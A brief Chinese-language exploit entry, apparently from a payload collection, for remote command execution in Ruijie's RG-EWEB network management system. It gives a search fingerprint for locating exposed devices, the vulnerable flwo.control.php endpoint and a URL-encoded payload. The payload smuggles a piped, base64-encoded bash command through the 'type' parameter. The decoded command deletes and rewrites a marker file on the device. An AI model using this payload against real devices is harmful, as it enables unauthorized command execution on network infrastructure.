# 锐捷RG-EWEB-flwo.contro-远程命令执行

锐捷 ｜ 命令执行 ｜ —
- **指纹**：`title="锐捷网络-EWEB网管系统"`
- **请求**：`POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1`

**Payload**
```
type=%7Cbash+-c+%27echo+cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
```
- **响应特征**：200